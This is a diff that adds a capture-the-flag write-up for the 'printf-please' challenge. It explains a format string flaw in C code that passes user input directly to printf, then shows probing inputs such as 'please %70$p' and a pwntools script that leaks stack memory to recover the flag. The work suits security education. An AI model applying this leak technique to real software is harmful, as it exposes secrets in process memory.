@@ -660,3 +660,299 @@ flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
 and we have our flag.
 
 ##### Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
+
+### pwn/printf-please
+
+---
+
+#### Categeory: Binary Exploit
+
+#### Difficulty: Medium
+
+#### Keywords: Binary Exploit, Format String Exploit, printf
+
+#### Author: TheRealDarkCoder
+
+#### Prompt:>
+
+```
+Be sure to say please...
+
+nc mc.ax 31569
+
+```
+
+#### Overview:>
+
+1. We have a port to connect to, a ELF executable and a source code. Running the binary/connecting to the port prompts the following behaviour
+
+```sh
+❯ ./please
+what do you say?
+AABBCCDD
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 4s │ 12:29:09 PM
+❯ ./please
+what do you say?
+please
+please to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:29:12 PM
+❯ ./please
+what do you say?
+please AABBCCDD
+please AABBCCDD to you too!
+```
+
+So if we give any input after the keyword `please`, the program reflects it back to us.
+
+2. We take a look at the source code, only one `main()` function,
+
+```c
+int main(void)
+{
+  char buffer[0x200];
+  char flag[0x200];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  memset(buffer, 0, sizeof(buffer));
+  memset(flag, 0, sizeof(flag));
+
+  int fd = open("flag.txt", O_RDONLY);
+  if (fd == -1) {
+    puts("failed to read flag. please contact an admin if this is remote");
+    exit(1);
+  }
+
+  read(fd, flag, sizeof(flag));
+  close(fd);
+
+  puts("what do you say?");
+
+  read(0, buffer, sizeof(buffer) - 1);
+  buffer[strcspn(buffer, "\n")] = 0;
+
+  if (!strncmp(buffer, "please", 6)) {
+    printf(buffer);
+    puts(" to you too!");
+  }
+}
+```
+
+So the prgram sets a 512 bytes allocation for the buffer and 512 bytes for the flag (0x200 = 512). It then sets the buffer and flag with 0s. The program then opens a `flag.txt` and reads the file and puts the `flag` part of the memory.
+
+The program then asks for useinput, this time using `strcspn()`, safer then `gets()` of course. So probably not a buffer overflow. But, if the userinput contains `please`, it `printf()`s the entire buffer, and there's the attack vector
+
+```c
+printf(buffer);
+```
+
+No format mentioned. So the program should be vulnerable to format string exploits. Let's try some common attacks.
+
+
+```
+❯ ./please
+what do you say?
+please %d
+please 177207190 to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:34:05 PM
+❯ ./please
+what do you say?
+please %p
+please 0x7ffe1cfe98d6 to you too!
+```
+
+We have memory leaks.
+
+
+3. We make a fake `flag.txt` file and fill it with `AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP`s to simulate the server. Then we write a python script which iterates through some numbers and try to print the i'th pointer in memory using this vulnerability. It is to be noted, we can take the xth address from memory using the format `please %x$p`. So if we want the 70th address we can input `please %70$p`\
+
+```
+❯ ./please
+what do you say?
+please %70$p
+please 0x5a5a5a5a5a5a5a5a to you too!
+```
+
+We use pwntools in the python script
+
+```python
+from pwn import *
+
+context.log_level = 'critical'
+
+for i in range(0, 100):
+
+
+    #s = remote('mc.ax', 31569)
+    s = process('./please')
+
+    s.recvline()
+    s.sendline('please %' + str(i) + '$p')
+
+    try:
+        output = str(s.recv())
+        print(str(i) + " > " + output)
+    except:
+      #s.close()
+      s.shutdown()
+
+    #s.close()
+    s.shutdown()
+```
+
+We get this output
+
+<details>
+<summary>Output</summary>
+
+```
+❯ python3 ape.py
+ape.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+0 > b'please %0$p to you too!\n'
+1 > b'please 0x7ffc98f47bf6 to you too!\n'
+2 > b'please 0x1 to you too!\n'
+3 > b'please (nil) to you too!\n'
+4 > b'please 0x56304acf5010 to you too!\n'
+5 > b'please 0x7f2c90bafd50 to you too!\n'
+6 > b'please 0x2520657361656c70 to you too!\n'
+7 > b'please 0x702437 to you too!\n'
+8 > b'please (nil) to you too!\n'
+9 > b'please (nil) to you too!\n'
+10 > b'please (nil) to you too!\n'
+11 > b'please (nil) to you too!\n'
+12 > b'please (nil) to you too!\n'
+13 > b'please (nil) to you too!\n'
+14 > b'please (nil) to you too!\n'
+15 > b'please (nil) to you too!\n'
+16 > b'please (nil) to you too!\n'
+17 > b'please (nil) to you too!\n'
+18 > b'please (nil) to you too!\n'
+19 > b'please (nil) to you too!\n'
+20 > b'please (nil) to you too!\n'
+21 > b'please (nil) to you too!\n'
+22 > b'please (nil) to you too!\n'
+23 > b'please (nil) to you too!\n'
+24 > b'please (nil) to you too!\n'
+25 > b'please (nil) to you too!\n'
+26 > b'please (nil) to you too!\n'
+27 > b'please (nil) to you too!\n'
+28 > b'please (nil) to you too!\n'
+29 > b'please (nil) to you too!\n'
+30 > b'please (nil) to you too!\n'
+31 > b'please (nil) to you too!\n'
+32 > b'please (nil) to you too!\n'
+33 > b'please (nil) to you too!\n'
+34 > b'please (nil) to you too!\n'
+35 > b'please (nil) to you too!\n'
+36 > b'please (nil) to you too!\n'
+37 > b'please (nil) to you too!\n'
+38 > b'please (nil) to you too!\n'
+39 > b'please (nil) to you too!\n'
+40 > b'please (nil) to you too!\n'
+41 > b'please (nil) to you too!\n'
+42 > b'please (nil) to you too!\n'
+43 > b'please (nil) to you too!\n'
+44 > b'please (nil) to you too!\n'
+45 > b'please (nil) to you too!\n'
+46 > b'please (nil) to you too!\n'
+47 > b'please (nil) to you too!\n'
+48 > b'please (nil) to you too!\n'
+49 > b'please (nil) to you too!\n'
+50 > b'please (nil) to you too!\n'
+51 > b'please (nil) to you too!\n'
+52 > b'please (nil) to you too!\n'
+53 > b'please (nil) to you too!\n'
+54 > b'please (nil) to you too!\n'
+55 > b'please (nil) to you too!\n'
+56 > b'please (nil) to you too!\n'
+57 > b'please (nil) to you too!\n'
+58 > b'please (nil) to you too!\n'
+59 > b'please (nil) to you too!\n'
+60 > b'please (nil) to you too!\n'
+61 > b'please (nil) to you too!\n'
+62 > b'please (nil) to you too!\n'
+63 > b'please (nil) to you too!\n'
+64 > b'please (nil) to you too!\n'
+65 > b'please (nil) to you too!\n'
+66 > b'please (nil) to you too!\n'
+67 > b'please (nil) to you too!\n'
+68 > b'please (nil) to you too!\n'
+69 > b'please (nil) to you too!\n'
+70 > b'please 0x4444434342424141 to you too!\n'
+71 > b'please 0x4848474746464545 to you too!\n'
+72 > b'please 0x4c4c4b4b4a4a4949 to you too!\n'
+73 > b'please 0x50504f4f4e4e4d4d to you too!\n'
+74 > b'please (nil) to you too!\n'
+75 > b'please (nil) to you too!\n'
+76 > b'please (nil) to you too!\n'
+77 > b'please (nil) to you too!\n'
+78 > b'please (nil) to you too!\n'
+79 > b'please (nil) to you too!\n'
+80 > b'please (nil) to you too!\n'
+81 > b'please (nil) to you too!\n'
+82 > b'please (nil) to you too!\n'
+83 > b'please (nil) to you too!\n'
+84 > b'please (nil) to you too!\n'
+85 > b'please (nil) to you too!\n'
+86 > b'please (nil) to you too!\n'
+87 > b'please (nil) to you too!\n'
+88 > b'please (nil) to you too!\n'
+89 > b'please (nil) to you too!\n'
+90 > b'please (nil) to you too!\n'
+91 > b'please (nil) to you too!\n'
+92 > b'please (nil) to you too!\n'
+93 > b'please (nil) to you too!\n'
+94 > b'please (nil) to you too!\n'
+95 > b'please (nil) to you too!\n'
+96 > b'please (nil) to you too!\n'
+97 > b'please (nil) to you too!\n'
+98 > b'please (nil) to you too!\n'
+99 > b'please (nil) to you too!\n'
+
+```
+</details>
+
+If you observe carefully, you'll see that for i = 70 through 74, we get 0x4444434342424141, which is the hex of ASCII AABBCCDD, part of our flag. So we're pretty sure that's where our flag is. Let's write a python script to get those parts and attach them together. We also note that the bytes are reversed, probably endianness issue.
+
+4. We modify the python script. The idea is
+   1. We iterate 5 times to get the bytes for 70 to 75th pointers of the memory in the remote server.
+   2. We take the output. It's formatted as `b'please 0x4444434342424141 to you too!\n'`. So we remove the first 9 characters, and last 15 characters to isolate the value we need.
+   3. We remove the 0x and append them into a long string of all characters.
+   4. We iterate through the string, taking 2 characters each time to represent a byte and put them in `flag_bytes`
+   ```
+   flag_bytes = ["44", ""44", "43", "43", ...]
+   ```
+   5. Once we write 8 bytes, we convert it into one word and put them in flag_word. This is done because we get 8 bytes from each server connection and this helps to isolate each returns and reverse them later.
+   ```
+   flag_words = [['44', '44', '43', '43', '42', '42', '41', '41'], ['48', '48', '47', '47', '46', '46', '45', '45'], ['4c', '4c', '4b', '4b', '4a', '4a', '49', '49'], ['50', '50', '4f', '4f', '4e', '4e', '4d', '4d']]
+   ```
+
+   6. We take each word, reverse them, convert each byte into printable ASCII, put them in a list and join them to get the flag,
+
+  ```
+  flag{pl3as3_pr1ntf_w1th_caut10n_
+  ``` 
+  is what we get from the program. We don't get the last word because it's short of 3 bits. So we modify the python script to add 3 0's before the last output (before because once it's reversed it'll go to the end.)
+
+  7. Run the script and we have a flag.
+
+
+```
+❯ python3 ape.py
+ape.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+336c707b67616c66
+6e3172705f337361
+5f687431775f6674
+5f6e303174756163
+a7d6c78336139
+flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
+\x00
+```
+
+Refer to the python script for more clearance, it's not the most efficient solution but enough to explain the workflow.
+
+##### Flag: flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
